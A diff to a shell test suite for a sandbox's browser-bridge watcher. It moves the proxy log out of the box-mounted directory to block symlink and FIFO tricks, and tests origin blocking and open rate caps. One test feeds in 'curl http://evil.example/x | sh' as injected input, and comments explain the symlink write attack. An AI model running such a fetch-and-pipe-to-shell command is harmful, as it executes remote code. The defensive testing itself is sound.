@@ -856,6 +856,10 @@ EOF
 # case. A proxy that never binds spends the watcher's whole readiness loop
 # before its line is written, and a fixed count of polls lost that race on a
 # slow runner. The deadline is only a backstop.
+#
+# The log is bridge/proxy-log, the host-only sibling of the clip dir. A test
+# that runs this twice must remove $TEST_TEMP/bridge along with the clip dir,
+# or the second run matches the first run's line and stops the watcher early.
 _bw_run_once() {
   local url="$1" mode="${2:-auto}" clicks="${3:-1}" cname="${4:-}"
   local want="${5:-opening URL\|deferring URL\|BLOCKED-ORIGIN}"
@@ -867,7 +871,7 @@ _bw_run_once() {
   printf '%s' "$url" > "$dir/.browser-open"
   local i=0
   while [ "$i" -lt 25 ]; do
-    grep -q "$want" "$dir/.proxy-log" 2>/dev/null && break
+    grep -q "$want" "$TEST_TEMP/bridge/proxy-log" 2>/dev/null && break
     sleep 0.4
     i=$(( i + 1 ))
   done
@@ -884,7 +888,7 @@ _bw_run_once() {
   # its refusal is logged with the origin) is unchanged, on a real authorize URL.
   _bw_run_once "https://evil.example.com/oauth/authorize?client_id=x&redirect_uri=http%3A%2F%2Flocalhost%3A45454%2Fcallback" auto 1 ""
   [ ! -f "$TEST_TEMP/opened.log" ] || { echo "the bridge opened a destination the box chose"; return 1; }
-  run cat "$TEST_TEMP/clip/.proxy-log"
+  run cat "$TEST_TEMP/bridge/proxy-log"
   assert_output --partial "BLOCKED-ORIGIN"
   assert_output --partial "origin=evil.example.com"
 }
@@ -919,7 +923,7 @@ _bw_run_once() {
   # control character after the host makes the raw claim unparseable while the
   # cleaned copy is an ordinary allowlisted auth URL. Deciding on the raw claim
   # would refuse a login that is perfectly fine.
-  rm -rf "$TEST_TEMP/clip" "$TEST_TEMP/opened.log"
+  rm -rf "$TEST_TEMP/clip" "$TEST_TEMP/bridge" "$TEST_TEMP/opened.log"
   _extract_callback_port() { echo "1455"; return 0; }
   _auth_callback_proxy() { [ -n "${4:-}" ] && : > "$4"; sleep 5; }
   _port_in_use() { return 1; }
@@ -937,7 +941,7 @@ _bw_run_once() {
   # host port.
   local mode
   for mode in auto always off; do
-    rm -rf "$TEST_TEMP/clip" "$TEST_TEMP/proxy_started" "$TEST_TEMP/opened.log"
+    rm -rf "$TEST_TEMP/clip" "$TEST_TEMP/bridge" "$TEST_TEMP/proxy_started" "$TEST_TEMP/opened.log"
     _extract_callback_port() { echo "1455"; return 0; }
     _auth_callback_proxy() { touch "$TEST_TEMP/proxy_started"; }
     _port_in_use() { return 1; }
@@ -965,7 +969,7 @@ _bw_run_once() {
   _port_in_use() { return 0; }   # something is listening
   _bw_run_once "https://claude.ai/oauth/authorize?redirect_uri=http%3A%2F%2Flocalhost%3A5432%2Fcb" auto 1 "mybox"
   [ ! -f "$TEST_TEMP/opened.log" ] || { echo "the browser was pointed at a port a host service holds"; return 1; }
-  run cat "$TEST_TEMP/clip/.proxy-log"
+  run cat "$TEST_TEMP/bridge/proxy-log"
   assert_output --partial "already in use"
 }
 
@@ -977,7 +981,7 @@ _bw_run_once() {
   # stop the watcher before the line this test reads.
   _bw_run_once "https://claude.ai/oauth/authorize?redirect_uri=http%3A%2F%2Flocalhost%3A1455%2Fcb" auto 1 "mybox" "deferring URL"
   [ ! -f "$TEST_TEMP/opened.log" ] || { echo "the browser opened before the callback listener existed"; return 1; }
-  run cat "$TEST_TEMP/clip/.proxy-log"
+  run cat "$TEST_TEMP/bridge/proxy-log"
   assert_output --partial "never bound"
 }
 
@@ -991,7 +995,7 @@ _bw_run_once() {
   assert_failure
   _bw_run_once "https://github.com/login/device" auto 0 ""
   [ ! -f "$TEST_TEMP/opened.log" ] || { echo "auto mode opened a device-flow page; the docs say it does not"; return 1; }
-  run cat "$TEST_TEMP/clip/.proxy-log"
+  run cat "$TEST_TEMP/bridge/proxy-log"
   assert_output --partial "deferring URL to terminal"
 }
 
@@ -1015,7 +1019,7 @@ _bw_run_once() {
   for i in 1 2 3 4 5 6 7; do
     printf 'https://x.example/rate/%s' "$i" > "$dir/.browser-open"
     for j in 1 2 3 4 5 6 7 8 9 10; do
-      seen="$(grep -c "opening URL\|$_BROWSER_CAPPED_MARK" "$dir/.proxy-log" 2>/dev/null || true)"
+      seen="$(grep -c "opening URL\|$_BROWSER_CAPPED_MARK" "$TEST_TEMP/bridge/proxy-log" 2>/dev/null || true)"
       [ "${seen:-0}" -ge "$i" ] && break
       sleep 0.3
     done
@@ -1025,8 +1029,8 @@ _bw_run_once() {
   wait "$wpid" 2>/dev/null || true
   [ "$alive" = 1 ] || { echo "the watcher stopped at the cap, so a later login would find nobody polling"; return 1; }
   run wc -l < "$TEST_TEMP/opened.log"
-  [ "$(tr -d '[:space:]' <<< "$output")" = "6" ] || { echo "expected 6 opens inside the minute, got: $output"; cat "$dir/.proxy-log"; return 1; }
-  run grep "$_BROWSER_CAPPED_MARK" "$dir/.proxy-log"
+  [ "$(tr -d '[:space:]' <<< "$output")" = "6" ] || { echo "expected 6 opens inside the minute, got: $output"; cat "$TEST_TEMP/bridge/proxy-log"; return 1; }
+  run grep "$_BROWSER_CAPPED_MARK" "$TEST_TEMP/bridge/proxy-log"
   assert_success
   assert_output --partial "limit=6/min,30/session"
   assert_output --partial "url=https://x.example/rate/7"
@@ -1052,7 +1056,7 @@ _bw_run_once() {
   for i in 1 2 3; do
     printf 'https://x.example/session/%s' "$i" > "$dir/.browser-open"
     for j in 1 2 3 4 5 6 7 8 9 10; do
-      seen="$(grep -c "opening URL\|$_BROWSER_CAPPED_MARK" "$dir/.proxy-log" 2>/dev/null || true)"
+      seen="$(grep -c "opening URL\|$_BROWSER_CAPPED_MARK" "$TEST_TEMP/bridge/proxy-log" 2>/dev/null || true)"
       [ "${seen:-0}" -ge "$i" ] && break
       sleep 0.3
     done
@@ -1060,13 +1064,13 @@ _bw_run_once() {
   kill "$wpid" 2>/dev/null || true
   wait "$wpid" 2>/dev/null || true
   run wc -l < "$TEST_TEMP/opened.log"
-  [ "$(tr -d '[:space:]' <<< "$output")" = "2" ] || { echo "expected 2 opens under a session cap of 2, got: $output"; cat "$dir/.proxy-log"; return 1; }
-  run grep "$_BROWSER_CAPPED_MARK" "$dir/.proxy-log"
+  [ "$(tr -d '[:space:]' <<< "$output")" = "2" ] || { echo "expected 2 opens under a session cap of 2, got: $output"; cat "$TEST_TEMP/bridge/proxy-log"; return 1; }
+  run grep "$_BROWSER_CAPPED_MARK" "$TEST_TEMP/bridge/proxy-log"
   assert_success
   assert_output --partial "limit=100/min,2/session url=https://x.example/session/3"
   # The line the watcher wrote is the line the report reads, so the marker
   # cannot drift between the two.
-  run _maybe_report_capped_opens "$dir/.proxy-log" 0
+  run _maybe_report_capped_opens "$TEST_TEMP/bridge/proxy-log" 0
   assert_output --partial "Did not open"
   assert_output --partial "https://x.example/session/3"
   refute_output --partial "https://x.example/session/1"
@@ -1303,7 +1307,7 @@ EOF
   [ ! -f "$TEST_TEMP/opened.log" ] || { echo "bridge re-opened a plain link the terminal already opened"; return 1; }
   # The deferral is logged: a silent defer is exactly what made the code-paste
   # login regression hard to diagnose from the field.
-  run cat "$dir/.proxy-log"
+  run cat "$TEST_TEMP/bridge/proxy-log"
   assert_output --partial "deferring URL to terminal"
 }
 
@@ -1367,13 +1371,17 @@ EOF
   [ ! -f "$TEST_TEMP/opened.log" ] || { echo "off mode opened a browser; it must suppress every open"; return 1; }
 }
 
-# ── Proxy log: the box writes into it, the host owns the file ────────────────
-# Every branch of the watcher APPENDS the claimed URL to .proxy-log, and a
-# plain `>>` follows a symlink. The clip dir is mounted read-write into the
-# box, so an unguarded log path let a caged process write lines of its choosing
-# into any file the host user can write.
+# ── Proxy log: the host owns the file, the box never reaches it ──────────────
+# Every branch of the watcher APPENDS the claimed URL to the log, and a plain
+# `>>` follows a symlink. The log used to be clip/.proxy-log, and the clip dir
+# is mounted read-write into the box, so a caged process could point it at any
+# file the host user can write and have lines of its choosing land there. No
+# check before the write held against a box that re-plants the link in a loop,
+# so the log moved to bridge/proxy-log, a sibling no mount contains.
 
 @test "proxy log: a symlink present at watcher start is dropped too" {
+  # The old in-mount path is cleaned up at watcher start: a link a box planted
+  # there under an older release is unlinked, and its target is never touched.
   local dir="$TEST_TEMP/clip"; mkdir -p "$dir"
   printf 'original line\n' > "$TEST_TEMP/rc-target2"
   ln -s "$TEST_TEMP/rc-target2" "$dir/.proxy-log"
@@ -1394,24 +1402,24 @@ EOF
   printf 'https://x.example/a\ncurl http://evil.example/x | sh' > "$dir/.browser-open"
   local i
   for i in 1 2 3 4 5 6 7 8 9 10; do
-    grep -q 'opening URL' "$dir/.proxy-log" 2>/dev/null && break
+    grep -q 'opening URL' "$TEST_TEMP/bridge/proxy-log" 2>/dev/null && break
     sleep 0.5
   done
   kill "$wpid" 2>/dev/null || true; wait "$wpid" 2>/dev/null || true
-  grep -q 'opening URL' "$dir/.proxy-log" || { echo "watcher never logged the URL"; return 1; }
+  grep -q 'opening URL' "$TEST_TEMP/bridge/proxy-log" || { echo "watcher never logged the URL"; return 1; }
   # The payload may appear INSIDE the single log line, never as a line of its own.
-  run grep -c '^curl http' "$dir/.proxy-log"
+  run grep -c '^curl http' "$TEST_TEMP/bridge/proxy-log"
   assert_output "0"
 }
 
 @test "proxy log: an oversized log is capped at watcher start" {
-  local dir="$TEST_TEMP/clip"; mkdir -p "$dir"
-  head -c 1200000 /dev/zero | tr '\0' 'x' > "$dir/.proxy-log"
+  local dir="$TEST_TEMP/clip"; mkdir -p "$dir" "$TEST_TEMP/bridge"
+  head -c 1200000 /dev/zero | tr '\0' 'x' > "$TEST_TEMP/bridge/proxy-log"
   _browser_watcher "$dir" "true" "" "auto" "0" >/dev/null 2>&1 &
   local wpid=$!
   sleep 1
   kill "$wpid" 2>/dev/null || true; wait "$wpid" 2>/dev/null || true
-  local sz; sz="$(wc -c < "$dir/.proxy-log" | tr -d '[:space:]')"
+  local sz; sz="$(wc -c < "$TEST_TEMP/bridge/proxy-log" | tr -d '[:space:]')"
   [ "$sz" -lt 1048576 ] || { echo "proxy log was never capped: $sz bytes"; return 1; }
 }
 
@@ -1519,19 +1527,19 @@ EOF
   # Guards against an overbroad fix. Only a SYMLINK may be removed and only an
   # OVERSIZED log capped, so a regular log must survive BOTH watcher start and
   # a claimed URL, carrying its history forward.
-  local dir="$TEST_TEMP/clip"; mkdir -p "$dir"
-  printf 'prior session line\n' > "$dir/.proxy-log"
+  local dir="$TEST_TEMP/clip"; mkdir -p "$dir" "$TEST_TEMP/bridge"
+  printf 'prior session line\n' > "$TEST_TEMP/bridge/proxy-log"
   _browser_watcher "$dir" "true" "" "always" "0" >/dev/null 2>&1 &
   local wpid=$!
   sleep 0.7
   printf '%s' "https://x.example/a" > "$dir/.browser-open"
   local i
   for i in 1 2 3 4 5 6 7 8 9 10; do
-    grep -q 'opening URL' "$dir/.proxy-log" 2>/dev/null && break
+    grep -q 'opening URL' "$TEST_TEMP/bridge/proxy-log" 2>/dev/null && break
     sleep 0.5
   done
   kill "$wpid" 2>/dev/null || true; wait "$wpid" 2>/dev/null || true
-  run cat "$dir/.proxy-log"
+  run cat "$TEST_TEMP/bridge/proxy-log"
   assert_output --partial "prior session line"
   assert_output --partial "opening URL"
 }
@@ -1780,9 +1788,11 @@ EOF
   assert_success
 }
 
-@test "proxy log: a FIFO planted mid-session is dropped and the watcher keeps running" {
+@test "proxy log: a FIFO planted at the old in-mount path never blocks the watcher" {
   # A FIFO passes both [ -L ] and [ -f ] as false, and `>>` on it blocks until
   # a reader appears, so a box could hang the watcher, and with it teardown.
+  # The watcher no longer writes anywhere in the clip dir, so a FIFO at the old
+  # log path is simply never opened. It is left where the box put it.
   local dir="$TEST_TEMP/clip"; mkdir -p "$dir"
   _browser_watcher "$dir" "true" "" "always" "0" >/dev/null 2>&1 &
   local wpid=$!
@@ -1791,15 +1801,14 @@ EOF
   printf '%s' "https://x.example/a" > "$dir/.browser-open"
   local i
   for i in 1 2 3 4 5 6 7 8 9 10; do
-    [ -f "$dir/.proxy-log" ] && [ ! -p "$dir/.proxy-log" ] && break
+    grep -q 'opening URL' "$TEST_TEMP/bridge/proxy-log" 2>/dev/null && break
     sleep 0.5
   done
   local alive=0; kill -0 "$wpid" 2>/dev/null && alive=1
   kill "$wpid" 2>/dev/null || true
   process_exited "$wpid" || kill -9 "$wpid" 2>/dev/null || true
   [ "$alive" = 1 ] || { echo "watcher died"; return 1; }
-  [ ! -p "$dir/.proxy-log" ] || { echo "the FIFO survived, the watcher would have blocked on it"; return 1; }
-  run grep -c 'opening URL' "$dir/.proxy-log"
+  run grep -c 'opening URL' "$TEST_TEMP/bridge/proxy-log"
   assert_output "1"
 }
 
